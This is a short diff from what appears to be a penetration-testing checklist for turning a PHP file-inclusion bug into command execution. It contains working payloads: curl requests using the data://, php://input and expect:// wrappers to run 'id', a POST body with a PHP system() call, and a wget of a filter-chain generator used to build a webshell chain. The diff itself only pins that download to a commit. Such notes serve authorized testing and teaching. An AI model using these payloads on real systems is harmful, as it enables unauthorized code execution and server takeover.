@@ -39,7 +39,7 @@ curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=data://text/plain;base64,PD9waHA
 curl -sk -X POST --data "<?php system('id'); ?>" "<Scheme>://<WebHost>/THE-PAGE?<Param>=php://input"
 curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=expect://id"
 A filter chain needs no setting at all: it builds the PHP out of php://filter conversions.
-wget https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/main/php_filter_chain_generator.py
+wget https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/2e93d3fd2d805a56499bc6fd4dfde9333b1da5a7/php_filter_chain_generator.py
 python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]`?>'
 curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=THE-CHAIN&0=id"
 - [ ] The URL refused as too long: the chain sent by POST, if the app reads $_REQUEST
